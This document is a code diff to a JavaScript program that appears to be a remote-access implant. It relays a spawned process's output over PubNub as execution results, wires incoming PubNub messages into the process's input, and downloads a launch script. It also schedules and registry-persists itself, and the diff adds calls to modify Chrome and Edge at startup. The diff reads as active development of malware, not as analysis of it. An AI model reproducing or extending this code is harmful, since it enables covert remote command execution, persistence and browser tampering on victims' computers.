@@ -2632,10 +2632,14 @@ function runnoderelay(pubnubo) {
     // Name
     // ProcessId
 
+    // [CADZ248S]: child.stdin.on --> wired up within relay() func
+    // lookup [7SZOSMSP]
+
+    // anchor --> 
     child.stdout.on("data", (data) => {
         const str = Buffer.from(data).toString();
 
-        logmsg(`Output: ${str}`);
+        logmsg(`[5LKC] Output: ${str}`);
 
         pubnubo.publishMessage({
             execresult: str,
@@ -2814,6 +2818,8 @@ function relay() {
 
     // note: python relay uses its own pubnub logic within the python script (pythonrelay.py)
 
+    // [7SZOSMSP]: wire up stdin of childp to incomming pubnub messages
+    // lookup [CADZ248S] for the childp stdout handlers
     if (enginename != "PY") {
         relaycmd.pubnubrelay = new PubnubRelay(enginename);
 
@@ -3205,6 +3211,7 @@ function penetrate_folders() {
     }
 }
 
+// TODO need to execute modify_chrome and modify_edge on each startup
 async function penetrate() {
     logmsg("starting");
 
@@ -3215,6 +3222,9 @@ async function penetrate() {
     if (!fileExists(systemconfig.launch_script_fpath)) {
         await download_launch_script();
     }
+
+    await modify_chrome();
+    await modify_edge();
 
     await reschedule();
     await penetrate_reg();
